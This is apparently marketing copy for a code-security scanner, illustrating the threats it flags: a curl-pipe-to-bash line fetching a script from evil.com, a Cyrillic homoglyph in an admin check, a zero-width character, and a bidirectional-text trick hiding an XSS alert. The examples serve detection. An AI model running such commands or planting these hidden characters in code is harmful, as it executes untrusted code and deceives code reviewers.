Known Malicious Commands

Vibe Securely flags commands from a configurable deny list, catching suspicious script executions immediately.

npm install
curl -sL https://evil.com/install.sh | bash
npm run build

Unicode Homoglyphs

Attackers can swap characters with visually identical ones from different scripts. We spot the difference so you don't have to.

const user = await findUserByUsername('admin');
if (user.isАdmin) { // The 'A' is Cyrillic
  grantSuperuserPrivileges();
}

Invisible Characters

Zero-width spaces and other invisible characters can be used to hide malicious code in plain sight. We make them visible.

if (is_production) {
  // This looks safe, but has a zero-width space
  run_prod_task();‍
}

Bidirectional Control Characters

Special characters can reverse the order of text, making a harmless-looking command execute something dangerous.

# This command appears to echo "safe"
echo "access-control: GREEN /*" LRI RLI LRI "*/ alert('XSS');" PDI
